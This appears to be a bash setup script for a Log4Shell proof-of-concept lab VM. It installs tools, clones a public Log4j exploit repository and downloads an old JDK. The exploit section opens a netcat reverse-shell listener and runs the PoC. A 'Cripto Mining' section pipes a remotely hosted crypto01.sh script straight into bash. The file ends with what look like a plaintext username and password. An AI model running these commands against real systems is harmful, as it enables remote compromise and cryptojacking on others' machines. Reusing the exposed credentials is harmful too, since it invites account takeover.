#! /bin/bash
sudo apt-get update
sudo apt-get install net-tools -y
sudo apt-get install xrdp -y
sudo apt-get install net-tools -y
sudo apt-get install python3 -y
sudo apt-get install git -y
sudo wget https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py
sudo mkdir ./log4shell-PoC
cd ./log4shell-PoC
sudo git clone https://github.com/kozmer/log4j-shell-poc
cd ./log4j-shell-poc
pip install -r requirements.txt
sudo wget https://storage.googleapis.com/hmoises-log4j-poc/jdk-8u20-linux-x64.tar.gz
sudo tar -xf jdk-8u20-linux-x64.tar.gz
./jdk1.8.0_20/bin/java -version
sudo apt install ubuntu-desktop-minimal -y
echo "installation finished. VM ready to run!"

##
#Log4Shell Exploit
nc -lvnp 9001
python3 poc.py --userip localhost --webport 8000 --lport 9001

#Cripto Mining
wget -O - "https://storage.googleapis.com/hmoises-log4j-poc/crypto01.sh" | bash


superfgt
Fortinet@LinuxTips#2024
